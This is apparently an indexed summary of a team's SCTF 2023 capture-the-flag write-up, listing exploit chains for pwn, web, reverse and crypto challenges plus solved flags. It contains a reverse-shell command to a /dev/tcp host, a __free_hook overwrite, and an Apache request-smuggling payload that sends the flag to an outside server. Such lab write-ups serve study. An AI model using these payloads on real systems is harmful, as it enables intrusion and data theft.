---
title: SCTF 2023 Writeup - Polaris 战队
contest: SCTF 2023
year: 2023
difficulty: high
vuln_type: misc_unknown
tags: [pwn, ret2text, rust-uaf, vec-grow, free-hook, web, cve-2023-25690, http-smuggling, php-unserialize, fuzzilli, rev-z3, hardware-circuit, crypto-pad-oracle, msb-oracle]
attack_chain:
  - PWN ancient_cgi: ret2text 简单栈溢出 + p64(vip=0x401129) + p64(main=0x400FF9) + padding 0xe8
  - POST /vip.cgi with session cookie 触发 ret2vip
  - PWN Brave Knights and Rusty Swords: Rust 逆向 + Vec::grow UAF
  - libc-2.27 + tcache 0x3ed8e8 __free_hook 0x3ed8e8
  - 512 push(6) + grow(0x400) + 多次 UAF free A→B→A 构成回环
  - 改 __free_hook=system + 写 "bash -c 'sh >/dev/tcp/.../... 0>&1 2>&1'" 反弹
  - WEB ezcheck1n: CVE-2023-25690 Apache HTTP Request Smuggling
  - 提示"今年不是2023年" → 2022.php + CRLF HTTP/1.1
  - payload: /2023/1 HTTP/1.1\r\nHost:localhost\r\n\r\nGET /2022.php?url=vps:445/?flag=
  - WEB fumo_backdoor: PHP 反序列化 + O:13:"fumo_backdoor":4:{path/argv/func/class}
  - func=phpinfo → session_start → PHPSESSID=bcbcbc → 触发 readfile
  - RE Syclang: 24 字节 z3 求解, 双层 L/R/X 加减 + 累加 + XOR
  - tmp1_L=[0,15,2,10,6,9,1,4] + tmp1_R=[8,23,11,20,13,21,19,17] + tmp1_X=[11,-13,17,-19,23,-29,31,-37]
  - tmp2_key 同样加减 + 累加
  - 逆向双层: 减法累加还原 tmp3_key
  - s.add(cin[23]==ord('}'), cin[0]==ord('s')) s.check()
  - RE Digital_circuit_learning: 硬件题 + enc() 9 步操作
  - sub_8001A8C 计算 a1=(a1>>6)&(a1>>2) → 1 bit 输出
  - 还原 enc 顺序 bdgfciejha → input 顺序 0x3b 0x77 0x71...
  - flag: SCTF{5149ac8b033d602bf6d3}
  - CRYPTO Barter: 椭圆曲线 + smooth n + 离散对数 e
  - P=114514*Q + rlist[0] 反向 + 恢复 rlist[55]/[66]/[77]/[88]/[99]
  - 爆破 seq 4 bit = 16 种 + 计算 add + xor + 解密
  - flag: SCTF{Th1s_i5_my_happy_s0ng_I_like_to_5ing_it_@ll_day_1ong}
  - CRYPTO Math forbidden: AES-CBC + RSA + 双重 padding oracle + MSB Oracle
  - Padding oracle 解 aeskey → sysKEY = 8 bytes
  - 还原后 adminadmin 拿 N/E/c
  - 260 轮 MSB Oracle 攻击还原 secret
key_payload: enc_key = b'bash -c "sh >/dev/tcp/xxxxxx/2333 0>&1 2>&1"' + p64(0) + p64(system) 写 __free_hook
one_liner: SCTF 2023 Polaris 战队多方向 WP：PWN CGI ret2text + Rust Vec UAF 改 free_hook + Web CVE-2023-25690 请求走私 + PHP 反序列化 + RE z3 求解 + 硬件电路 + Crypto 椭圆曲线 + AES Padding/MSB Oracle。
lesson: Rust Vec::grow UAF 是 Rust 二进制程序漏洞常见入口；CVE-2023-25690 Apache HTTP 请求走私是 web 经典高阶利用；MSB Oracle + Padding Oracle 组合攻击 RSA+AES 是 CBC+RSA 联合加密场景必备技巧。
quality: high
---
